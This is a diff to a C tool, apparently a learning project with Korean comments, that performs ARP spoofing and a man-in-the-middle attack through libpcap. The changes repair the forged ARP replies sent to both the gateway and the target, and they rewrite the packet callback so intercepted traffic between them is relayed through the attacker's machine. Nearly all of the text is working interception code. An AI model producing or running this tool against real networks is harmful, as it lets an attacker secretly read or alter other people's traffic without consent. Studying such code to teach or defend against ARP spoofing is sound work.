@@ -24,6 +24,7 @@ typedef struct arg_cb_send_packet{
   unsigned char target_ip[16];
   unsigned char local_mac[6];
   unsigned char local_ip[16];
+  pcap_t* handle;
 } ArgSendPacket;
 
 typedef struct arg_t_receive_packet{
@@ -168,7 +169,7 @@ void t_send_arp_reply_mitm(void* data){
     struct ether_header header;
     header.ether_type = htons(ETH_P_ARP);
     memcpy(header.ether_dhost, (unsigned char*)gateway_mac, sizeof(header.ether_dhost));
-    memcpy(header.ether_shost, (unsigned char*)target_mac, sizeof(header.ether_shost));
+    memcpy(header.ether_shost, (unsigned char*)local_mac, sizeof(header.ether_shost));
 
     // Construct ARP Request
     struct ether_arp req;
@@ -209,12 +210,12 @@ void t_send_arp_reply_mitm(void* data){
     }
 
     if(!pcap){
-      fprintf(stderr, "[DEBUG] Could not send arp replay to gateway\n");
+      
       return -1;
     }
 
     if(pcap_inject(pcap, frame, sizeof(frame)) == -1){
-      pcap_perror(pcap, 0);
+      fprintf(stderr, "[DEBUG] Could not send arp replay to gateway\n");
       pcap_close(pcap);
       return -1;
     }
@@ -222,7 +223,7 @@ void t_send_arp_reply_mitm(void* data){
     // Construct Ethernet Header
     header.ether_type = htons(ETH_P_ARP);
     memcpy(header.ether_dhost, (unsigned char*)target_mac, sizeof(header.ether_dhost));
-    memcpy(header.ether_shost, (unsigned char*)gateway_mac, sizeof(header.ether_shost));
+    memcpy(header.ether_shost, (unsigned char*)local_mac, sizeof(header.ether_shost));
 
     // Construct ARP Request
     req.arp_hrd = htons(ARPHRD_ETHER);
@@ -257,12 +258,12 @@ void t_send_arp_reply_mitm(void* data){
     }
 
     if(!pcap){
-      fprintf(stderr, "[DEBUG] Could not send arp replay to target\n");
+      
       return -1;
     }
 
     if(pcap_inject(pcap, frame, sizeof(frame)) == -1){
-      pcap_perror(pcap, 0);
+      fprintf(stderr, "[DEBUG] Could not send arp replay to target\n");
       pcap_close(pcap);
       return -1;
     }
@@ -407,42 +408,25 @@ void cb_send_packet(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char*
   libnet_t *l;
   struct libnet_link_int* network;
   char errbuf[LIBNET_ERRBUF_SIZE];
-  int c;
 
-  l = libnet_init(LIBNET_LINK_ADV, ((ArgSendPacket*)arg)->interface, errbuf);
-  if(l == NULL){
-    printf("[DEBUG] libnet_init() failed: %s\n", errbuf);
-  }
-  
-  ethhdr = packet;
-  if(ntohs(ethhdr->ether_type) == ETHERTYPE_IP){  // IP 패킷 이라면
-    // Src, Dest MAC 변경
-    if(memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->target_mac, sizeof(ethhdr->ether_shost)))  // OutBound 일 경우
-      memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->gateway_mac, sizeof(ethhdr->ether_dhost));
-    else if(memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->gateway_mac, sizeof(ethhdr->ether_shost)))  // InBound 일 경우
-      memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->target_mac, sizeof(ethhdr->ether_dhost));
-    memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, sizeof(ethhdr->ether_shost));  
+  ethhdr = (struct ether_header *)packet;
+  iph = (struct ip *)(packet + sizeof(struct ether_header));
+  //printf("CALLBACK !\n");
+  if(ntohs(ethhdr->ether_type) == ETHERTYPE_IP && (!(strcmp(inet_ntoa(iph->ip_dst), ((ArgSendPacket*)arg)->target_ip)) || !(strcmp(inet_ntoa(iph->ip_src), ((ArgSendPacket*)arg)->target_ip)))){
     
-    // Src, Dest IP 변경
-    packet += sizeof(struct ether_header);
-    iph = (struct ip*)packet;/*  // IP 레이어는 변경해줄 필요가 없다고 함
-    if(strcmp(inet_ntoa(iph->ip_src), ((ArgSendPacket*)arg)->target_ip))  // OutBound 일 경우 
-      iph->ip_dst.s_addr = inet_addr(((ArgSendPacket*)arg)->gateway_ip);
-    else if(strcmp(inet_ntoa(iph->ip_src), ((ArgSendPacket*)arg)->gateway_ip))  // InBound 일 경우
-      iph->ip_dst.s_addr = inet_addr(((ArgSendPacket*)arg)->target_ip);
-    iph->ip_src.s_addr = inet_addr(((ArgSendPacket*)arg)->local_ip);
-    */
-    packet += sizeof(struct ip);
-
-    if ((libnet_build_ethernet(ethhdr->ether_dhost, ethhdr->ether_shost, ETHERTYPE_IP, NULL, 0, l, NULL)) == -1)
-    fprintf(stderr, "[DEBUG] Cannot build ethernet header: %s\n", libnet_geterror(l));
-    libnet_build_ipv4((pkthdr->len) - sizeof(struct ether_header), iph->ip_tos, iph->ip_id, iph->ip_off, iph->ip_ttl, iph->ip_p, iph->ip_sum, iph->ip_src.s_addr, iph->ip_dst.s_addr, packet, (pkthdr->len) - (sizeof(struct ether_header) + sizeof(struct ip)), l, NULL);
-    
-    if((libnet_write(l)) == -1)
-      fprintf(stderr, "[DEBUG] Unable to send packet: %s\n", libnet_geterror(l));
+    if(!memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->target_mac, 6)) {
+      //printf("from sender to gateway\n");
+	memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, 6);
+	memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->gateway_mac, 6);
+    }
+    else if(!memcmp(ethhdr->ether_shost, ((ArgSendPacket*)arg)->gateway_mac, 6)) {
+      //printf("from gateway to sender\n");
+      memcpy(ethhdr->ether_shost, ((ArgSendPacket*)arg)->local_mac, 6);
+      memcpy(ethhdr->ether_dhost, ((ArgSendPacket*)arg)->target_mac, 6);
+    }
+    //printf("handle : %d\n", ((ArgSendPacket*)arg)->handle);
+    pcap_sendpacket(((ArgSendPacket*)arg)->handle, packet, pkthdr->len);
   }
-  
-  libnet_destroy(l);
   
   return 0;
 }
@@ -463,7 +447,7 @@ void t_receive_packet(void* data){
     fprintf(stderr, "[DEBUG] Could not open device %s: %s\n", ((ArgRevPacket*)data)->interface, errbuf);
     return NULL;
   }
-
+  
   char* filter_exp = "";
   if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
     fprintf(stderr, "[DEBUG] Could not parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
@@ -476,6 +460,7 @@ void t_receive_packet(void* data){
   }
   
   arg.interface = ((ArgRevPacket*)data)->interface;
+  arg.handle = handle;
   memcpy(arg.gateway_mac, ((ArgRevPacket*)data)->gateway_mac, sizeof(arg.gateway_mac));
   memcpy(arg.gateway_ip, ((ArgRevPacket*)data)->gateway_ip, sizeof(arg.gateway_ip));
   memcpy(arg.target_mac, ((ArgRevPacket*)data)->target_mac, sizeof(arg.target_mac));
@@ -595,8 +580,8 @@ int main(int argc, char** argv){
     perror("[-] Send ARP MITM Reply Failed !\n");
   //send_arp_reply_mitm(dev, gateway_ip, gateway_mac, argv[1], target_mac, local_mac);
 
-  //  pthread_join(p_thread[0], NULL);
-
+  // pthread_join(p_thread[0], NULL);
+  
   arg_t_rev_packet.interface = dev;
   arg_t_rev_packet.gateway_ip = gateway_ip;
   arg_t_rev_packet.gateway_mac = gateway_mac;
